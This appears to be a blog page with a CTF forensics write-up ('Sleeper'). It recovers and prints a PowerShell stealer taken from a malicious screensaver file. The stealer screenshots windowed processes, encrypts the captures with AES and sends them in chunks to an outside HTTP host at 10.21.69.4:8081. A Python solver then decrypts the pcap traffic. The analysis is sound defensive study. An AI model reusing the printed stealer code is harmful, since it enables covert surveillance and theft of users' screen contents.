@@ -1,0 +1,166 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta name="generator" content="Astro v7.1.1"><meta property="og:title" content="Sleeper | k3ng.xyz"><meta property="og:description" content="CTF writeups, digital forensics, and cyber security notes by k3ng."><meta property="og:type" content="website"><link rel="icon" type="image/jpeg" href="/favicon.jpg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"><title>Sleeper | k3ng.xyz</title><script>
+      const savedTheme = localStorage.getItem('theme');
+      const preferredTheme = matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+      document.documentElement.dataset.theme = savedTheme || preferredTheme;
+    </script><link rel="stylesheet" href="/_astro/BaseLayout.DZwBvaeU.css"></head><body><header class="site-header"><div class="header-inner"><a class="wordmark" href="/" aria-label="Home">k3ng</a><nav aria-label="Primary navigation"><a href="/blog">Blog</a><a href="/writeups" aria-current="page">Writeups</a><a href="/about">About</a></nav><button class="theme-toggle" type="button" aria-label="Toggle color theme"><span class="theme-light" aria-hidden="true">☼</span><span class="theme-dark" aria-hidden="true">☾</span></button></div></header><main class="article-shell has-toc"><article><header class="article-header"><p class="eyebrow">Cyber Jawara International 2024</p><h1>Sleeper</h1><ul class="article-tags" aria-label="Article tags"><li>powershell</li><li>dnspy</li><li>pcap-analysis</li><li>aes-cbc</li><li>screen-capture</li></ul></header><div class="prose"><h3 id="description">Description</h3>
+<p>Author: Blacowhait</p>
+<p>Wareth is a person who always leaving her laptop without sleep, lock, or anything he doing self. He only depend to windows feature for automate handle her laptop. Someday he cant access her account! he said he dont do anything suspicious, but few hours ago he install an app for internet. Can you helpp?!</p>
+<h3 id="flag">Flag</h3>
+<p><code>CJ{stealer_everywhere__becareful_what_in/on/at_internet}</code></p>
+<hr>
+<h3 id="analysis">Analysis</h3>
+<p>We are given a network packet capture file and an <code>ad1</code> image file. From the packet capture, we can infer that data is transmitted using HTTP through the query parameter. The last part of the key contains the index and the value contains the data itself.</p>
+<p><img src="/images/sleeper/sleeper_1.png" alt="Query parameter from Wireshark"></p>
+<p>After analyzing the disk image, we found new files on the <code>C:\Windows\SysWOW64</code> directory. One is a screensaver file and another an executable.</p>
+<p><img src="/images/sleeper/sleeper_2.png" alt="Files on C:\Windows\SysWOW64"></p>
+<p>The <code>chkmnt.exe</code> executable is just a normal screen capture application. But the <code>sconsvr.scr</code> file is interesting. Since <code>.scr</code> files are basically PE executables, we can reverse-engineer it using DNSpy.</p>
+<p>From DNSpy, we found a resource called <code>ss-all-proc.ps1</code> inside the executable. This script will take a screenshot of every process, encrypts them using AES, and then sends it as an HTTP request just like the one we found on the packet capture.</p>
+<p>Credits to <strong>aster</strong> for finding these files.</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#FF7B72">function</span><span style="color:#D2A8FF"> Encrypt-File</span><span style="color:#E6EDF3"> {</span></span>
+<span class="line"><span style="color:#FF7B72">    param</span><span style="color:#E6EDF3"> (</span></span>
+<span class="line"><span style="color:#E6EDF3">        [</span><span style="color:#FF7B72">string</span><span style="color:#E6EDF3">]$D783C0</span><span style="color:#FF7B72">,</span></span>
+<span class="line"><span style="color:#E6EDF3">        [</span><span style="color:#FF7B72">string</span><span style="color:#E6EDF3">]$6766A9</span><span style="color:#FF7B72">,</span></span>
+<span class="line"><span style="color:#E6EDF3">        [</span><span style="color:#FF7B72">string</span><span style="color:#E6EDF3">]$92EE28</span></span>
+<span class="line"><span style="color:#E6EDF3">    )</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">    Write-Output</span><span style="color:#E6EDF3"> $6766A9</span></span>
+<span class="line"><span style="color:#79C0FF">    Write-Output</span><span style="color:#E6EDF3"> $92EE28</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $4099D1 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Text.Encoding</span><span style="color:#E6EDF3">]::UTF8.GetBytes($6766A9)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $68263A </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Text.Encoding</span><span style="color:#E6EDF3">]::UTF8.GetBytes($92EE28)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> ($4099D1.Length </span><span style="color:#FF7B72">-ne</span><span style="color:#79C0FF"> 16</span><span style="color:#FF7B72"> -and</span><span style="color:#E6EDF3"> $4099D1.Length </span><span style="color:#FF7B72">-ne</span><span style="color:#79C0FF"> 24</span><span style="color:#FF7B72"> -and</span><span style="color:#E6EDF3"> $4099D1.Length </span><span style="color:#FF7B72">-ne</span><span style="color:#79C0FF"> 32</span><span style="color:#E6EDF3">) {</span></span>
+<span class="line"><span style="color:#FF7B72">        throw</span><span style="color:#A5D6FF"> "ERROR"</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> ($68263A.Length </span><span style="color:#FF7B72">-ne</span><span style="color:#79C0FF"> 16</span><span style="color:#E6EDF3">) {</span></span>
+<span class="line"><span style="color:#FF7B72">        throw</span><span style="color:#A5D6FF"> "ERROR"</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $88DB2B </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> New-Object</span><span style="color:#A5D6FF"> "System.Security.Cryptography.AesManaged"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $88DB2B.Key </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $4099D1</span></span>
+<span class="line"><span style="color:#E6EDF3">    $88DB2B.IV </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $68263A</span></span>
+<span class="line"><span style="color:#E6EDF3">    $88DB2B.Mode </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Security.Cryptography.CipherMode</span><span style="color:#E6EDF3">]::CBC</span></span>
+<span class="line"><span style="color:#E6EDF3">    $88DB2B.Padding </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Security.Cryptography.PaddingMode</span><span style="color:#E6EDF3">]::PKCS7</span></span>
+<span class="line"><span style="color:#E6EDF3">    $BDAE58 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.IO.File</span><span style="color:#E6EDF3">]::ReadAllBytes($D783C0)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $FF85F8 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $88DB2B.CreateEncryptor()</span></span>
+<span class="line"><span style="color:#E6EDF3">    $42B0F0 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $FF85F8.TransformFinalBlock($BDAE58</span><span style="color:#FF7B72">,</span><span style="color:#79C0FF"> 0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $BDAE58.Length);</span></span>
+<span class="line"><span style="color:#E6EDF3">    [</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">[]] $C81F44 </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $88DB2B.IV </span><span style="color:#FF7B72">+</span><span style="color:#E6EDF3"> $42B0F0</span></span>
+<span class="line"><span style="color:#E6EDF3">    $88DB2B.Dispose()</span></span>
+<span class="line"><span style="color:#E6EDF3">    $res </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">Convert</span><span style="color:#E6EDF3">]::ToBase64String($C81F44)</span></span>
+<span class="line"><span style="color:#FF7B72">    return</span><span style="color:#E6EDF3"> $res</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#8B949E"># $processArray = Get-Process | Where-Object {$_.mainWindowTitle} | Select-Object ProcessName</span></span>
+<span class="line"><span style="color:#E6EDF3">$processArray </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Get-Process</span><span style="color:#FF7B72"> |</span><span style="color:#79C0FF"> Where-Object</span><span style="color:#E6EDF3"> { </span><span style="color:#79C0FF">$_</span><span style="color:#E6EDF3">.MainWindowTitle } </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> Select-Object</span><span style="color:#E6EDF3"> MainWindowTitle</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">foreach</span><span style="color:#E6EDF3"> ($process </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> $processArray) {</span></span>
+<span class="line"><span style="color:#E6EDF3">    $tmp </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $process.MainWindowTitle</span></span>
+<span class="line"><span style="color:#E6EDF3">    $filePath </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "C:\Users\Public\Pictures\tmp.png"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $command </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "C:\Windows\SysWOW64\chkmnt.exe </span><span style="color:#E6EDF3">$filepath</span><span style="color:#E6EDF3"> $tmp</span><span style="color:#A5D6FF">"</span></span>
+<span class="line"><span style="color:#79C0FF">    Invoke-Expression</span><span style="color:#E6EDF3"> $command</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $regValue </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "HKCU:\Control Panel\Desktop"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $value </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> (</span><span style="color:#79C0FF">Get-ItemProperty</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">Path $regValue </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3">Name </span><span style="color:#A5D6FF">"ScreenSaveTimeout"</span><span style="color:#E6EDF3">).</span><span style="color:#A5D6FF">"ScreenSaveTimeout"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $random </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Random</span><span style="color:#E6EDF3">]::New($value)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $characters </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $key </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> -join</span><span style="color:#E6EDF3"> ((</span><span style="color:#79C0FF">1</span><span style="color:#FF7B72">..</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> ForEach-Object</span><span style="color:#E6EDF3"> { $characters[$random.Next(</span><span style="color:#79C0FF">0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $characters.Length)] })</span></span>
+<span class="line"><span style="color:#79C0FF">    Write-Output</span><span style="color:#E6EDF3"> $key</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $random </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Random</span><span style="color:#E6EDF3">]::New($value)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $characters </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $IV </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> -join</span><span style="color:#E6EDF3"> ((</span><span style="color:#79C0FF">1</span><span style="color:#FF7B72">..</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> ForEach-Object</span><span style="color:#E6EDF3"> { $characters[$random.Next(</span><span style="color:#79C0FF">0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $characters.Length)] })</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $base64Encoded </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Encrypt</span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3">File $filePath $key $IV</span></span>
+<span class="line"><span style="color:#E6EDF3">    $base64Encoded </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $base64Encoded[</span><span style="color:#79C0FF">2</span><span style="color:#E6EDF3">]</span></span>
+<span class="line"><span style="color:#E6EDF3">    $chunkSize </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 1024</span></span>
+<span class="line"><span style="color:#E6EDF3">    $totalChunks </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">math</span><span style="color:#E6EDF3">]::Ceiling($base64Encoded.Length </span><span style="color:#FF7B72">/</span><span style="color:#E6EDF3"> $chunkSize)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $baseUrl </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> 'http://10.21.69.4:8081'</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">    for</span><span style="color:#E6EDF3"> ($i </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 0</span><span style="color:#E6EDF3">; $i </span><span style="color:#FF7B72">-lt</span><span style="color:#E6EDF3"> $totalChunks; $i</span><span style="color:#FF7B72">++</span><span style="color:#E6EDF3">) { </span></span>
+<span class="line"><span style="color:#E6EDF3">        $startIndex </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $i </span><span style="color:#FF7B72">*</span><span style="color:#E6EDF3"> $chunkSize; $length </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">math</span><span style="color:#E6EDF3">]::Min($chunkSize</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $base64Encoded.Length </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3"> $startIndex)</span></span>
+<span class="line"><span style="color:#E6EDF3">        $chunk </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> $base64Encoded.Substring($startIndex</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $length)</span></span>
+<span class="line"><span style="color:#E6EDF3">        $chunkUrlEncoded </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Net.WebUtility</span><span style="color:#E6EDF3">]::UrlEncode($chunk)</span></span>
+<span class="line"><span style="color:#E6EDF3">        $fullUrl </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "</span><span style="color:#E6EDF3">${baseUrl}</span><span style="color:#A5D6FF">?vBRqSiWY</span><span style="color:#E6EDF3">$i</span><span style="color:#A5D6FF">=</span><span style="color:#E6EDF3">$chunkUrlEncoded</span><span style="color:#A5D6FF">"</span></span>
+<span class="line"><span style="color:#79C0FF">	Write-Output</span><span style="color:#E6EDF3"> $fullUrl</span></span>
+<span class="line"><span style="color:#E6EDF3">        $response </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> Invoke-RestMethod</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">Uri $fullUrl </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3">Method Get</span></span>
+<span class="line"><span style="color:#E6EDF3">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">    Remove-Item</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">Path $filePath</span></span>
+<span class="line"><span style="color:#E6EDF3">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">$scrnsave </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "C:\Windows\SysWOW64\angi.exe"</span></span>
+<span class="line"><span style="color:#79C0FF">Invoke-Expression</span><span style="color:#E6EDF3"> $scrnsave</span></span></code></pre>
+<p>We can see that the IV will be prefixed when the data is sent using HTTP, but how do we actually get the key? Turns out the key and IV will be exactly the same, since we are using the same seed from the <code>HKCU:\Control Panel\Desktop\ScreenSaveTimeout</code> registry key. </p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#8B949E"># snip</span></span>
+<span class="line"><span style="color:#E6EDF3">    $value </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> (</span><span style="color:#79C0FF">Get-ItemProperty</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">Path $regValue </span><span style="color:#FF7B72">-</span><span style="color:#E6EDF3">Name </span><span style="color:#A5D6FF">"ScreenSaveTimeout"</span><span style="color:#E6EDF3">).</span><span style="color:#A5D6FF">"ScreenSaveTimeout"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $random </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Random</span><span style="color:#E6EDF3">]::New($value)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $characters </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $key </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> -join</span><span style="color:#E6EDF3"> ((</span><span style="color:#79C0FF">1</span><span style="color:#FF7B72">..</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> ForEach-Object</span><span style="color:#E6EDF3"> { $characters[$random.Next(</span><span style="color:#79C0FF">0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $characters.Length)] })</span></span>
+<span class="line"><span style="color:#79C0FF">    Write-Output</span><span style="color:#E6EDF3"> $key</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">    $random </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">System.Random</span><span style="color:#E6EDF3">]::New($value)</span></span>
+<span class="line"><span style="color:#E6EDF3">    $characters </span><span style="color:#FF7B72">=</span><span style="color:#A5D6FF"> "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span></span>
+<span class="line"><span style="color:#E6EDF3">    $IV </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> -join</span><span style="color:#E6EDF3"> ((</span><span style="color:#79C0FF">1</span><span style="color:#FF7B72">..</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">|</span><span style="color:#79C0FF"> ForEach-Object</span><span style="color:#E6EDF3"> { $characters[$random.Next(</span><span style="color:#79C0FF">0</span><span style="color:#FF7B72">,</span><span style="color:#E6EDF3"> $characters.Length)] })</span></span>
+<span class="line"><span style="color:#8B949E"># snip</span></span></code></pre>
+<h3 id="solution">Solution</h3>
+<p>The goal is that we need to decrypt the query parameter value from the HTTP packet using AES with the key and IV from the first 16 characters of the data, and assemble them based on the index on the query parameter key. After creating a script for that, we will get the flag from one of the screen captures.</p>
+<p><img src="/images/sleeper/sleeper_3.png" alt="Screenshot containing the flag"></p>
+<h3 id="solver-script">Solver Script</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> scapy.all </span><span style="color:#FF7B72">import</span><span style="color:#FF7B72"> *</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> scapy.layers.http </span><span style="color:#FF7B72">import</span><span style="color:#FF7B72"> *</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> urllib.parse </span><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> unquote</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> base64 </span><span style="color:#FF7B72">import</span><span style="color:#E6EDF3"> b64decode</span></span>
+<span class="line"><span style="color:#FF7B72">from</span><span style="color:#E6EDF3"> Crypto.Cipher </span><span style="color:#FF7B72">import</span><span style="color:#79C0FF"> AES</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">res </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">b</span><span style="color:#A5D6FF">""</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">*</span><span style="color:#79C0FF"> 1000</span></span>
+<span class="line"><span style="color:#E6EDF3">packets </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> rdpcap(</span><span style="color:#A5D6FF">"./needsleeppls.pcap"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">started </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> False</span></span>
+<span class="line"><span style="color:#E6EDF3">filecount </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> 1</span></span>
+<span class="line"><span style="color:#E6EDF3">key </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> b</span><span style="color:#A5D6FF">"EarWS9whYYeT2q8f"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> p </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> packets:</span></span>
+<span class="line"><span style="color:#FF7B72">    if</span><span style="color:#E6EDF3"> p.haslayer(</span><span style="color:#79C0FF">IP</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">and</span><span style="color:#E6EDF3"> p.haslayer(Raw):</span></span>
+<span class="line"><span style="color:#FF7B72">        if</span><span style="color:#E6EDF3"> p.getlayer(</span><span style="color:#79C0FF">IP</span><span style="color:#E6EDF3">).dst </span><span style="color:#FF7B72">==</span><span style="color:#A5D6FF"> "10.21.69.4"</span><span style="color:#E6EDF3">:</span></span>
+<span class="line"><span style="color:#E6EDF3">            payload </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> p.getlayer(Raw).load</span></span>
+<span class="line"><span style="color:#FF7B72">            if</span><span style="color:#FF7B72"> b</span><span style="color:#A5D6FF">"GET /?vBRqSiWY"</span><span style="color:#FF7B72"> in</span><span style="color:#E6EDF3"> payload:</span></span>
+<span class="line"><span style="color:#E6EDF3">                start </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload.index(</span><span style="color:#FF7B72">b</span><span style="color:#A5D6FF">"="</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">+</span><span style="color:#79C0FF"> 1</span></span>
+<span class="line"><span style="color:#E6EDF3">                end </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload.index(</span><span style="color:#FF7B72">b</span><span style="color:#A5D6FF">" HTTP"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"><span style="color:#E6EDF3">                index_start </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload.index(</span><span style="color:#FF7B72">b</span><span style="color:#A5D6FF">"WY"</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">+</span><span style="color:#79C0FF"> 2</span></span>
+<span class="line"><span style="color:#E6EDF3">                index </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> int</span><span style="color:#E6EDF3">(payload[index_start:start</span><span style="color:#FF7B72">-</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">])</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">                if</span><span style="color:#E6EDF3"> index </span><span style="color:#FF7B72">==</span><span style="color:#79C0FF"> 0</span><span style="color:#FF7B72"> and</span><span style="color:#E6EDF3"> started:</span></span>
+<span class="line"><span style="color:#E6EDF3">                    data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> b64decode(</span><span style="color:#FF7B72">b</span><span style="color:#A5D6FF">""</span><span style="color:#E6EDF3">.join(res))</span></span>
+<span class="line"><span style="color:#E6EDF3">                    data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> data[</span><span style="color:#79C0FF">16</span><span style="color:#E6EDF3">:]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">                    cipher </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> AES</span><span style="color:#E6EDF3">.new(key, </span><span style="color:#79C0FF">AES</span><span style="color:#E6EDF3">.</span><span style="color:#79C0FF">MODE_CBC</span><span style="color:#E6EDF3">, key)</span></span>
+<span class="line"><span style="color:#E6EDF3">                    decrypted </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cipher.decrypt(data)</span></span>
+<span class="line"><span style="color:#FF7B72">                    with</span><span style="color:#79C0FF"> open</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">f</span><span style="color:#A5D6FF">"decrypted_</span><span style="color:#FF7B72">{</span><span style="color:#E6EDF3">filecount</span><span style="color:#FF7B72">}</span><span style="color:#A5D6FF">.png"</span><span style="color:#E6EDF3">, </span><span style="color:#A5D6FF">"wb"</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">as</span><span style="color:#E6EDF3"> f:</span></span>
+<span class="line"><span style="color:#E6EDF3">                        f.write(decrypted)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">                    res </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> [</span><span style="color:#FF7B72">b</span><span style="color:#A5D6FF">""</span><span style="color:#E6EDF3">] </span><span style="color:#FF7B72">*</span><span style="color:#79C0FF"> 1000</span></span>
+<span class="line"><span style="color:#E6EDF3">                    filecount </span><span style="color:#FF7B72">+=</span><span style="color:#79C0FF"> 1</span></span>
+<span class="line"><span style="color:#FF7B72">                elif</span><span style="color:#FF7B72"> not</span><span style="color:#E6EDF3"> started:</span></span>
+<span class="line"><span style="color:#E6EDF3">                    started </span><span style="color:#FF7B72">=</span><span style="color:#79C0FF"> True</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">                payload </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload[start:end]</span></span>
+<span class="line"><span style="color:#E6EDF3">                payload </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> unquote(payload).encode(</span><span style="color:#A5D6FF">"utf-8"</span><span style="color:#E6EDF3">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">                res[index] </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> payload</span></span></code></pre></div></article><aside class="toc" aria-label="On this page"><p>On this page</p><ol><li class="nested"><a href="#description">Description</a></li><li class="nested"><a href="#flag">Flag</a></li><li class="nested"><a href="#analysis">Analysis</a></li><li class="nested"><a href="#solution">Solution</a></li><li class="nested"><a href="#solver-script">Solver Script</a></li></ol></aside></main><footer class="site-footer"><div><span>k3ng.xyz</span><span class="footer-note">2026</span></div></footer><script>
+      document.querySelector('.theme-toggle')?.addEventListener('click', () => {
+        const theme = document.documentElement.dataset.theme === 'dark' ? 'light' : 'dark';
+        const updateTheme = () => {
+          document.documentElement.dataset.theme = theme;
+          localStorage.setItem('theme', theme);
+        };
+
+        if (document.startViewTransition) {
+          document.startViewTransition(updateTheme);
+          return;
+        }
+
+        document.documentElement.classList.add('theme-transition');
+        updateTheme();
+        setTimeout(() => document.documentElement.classList.remove('theme-transition'), 650);
+      });
+    </script></body></html>
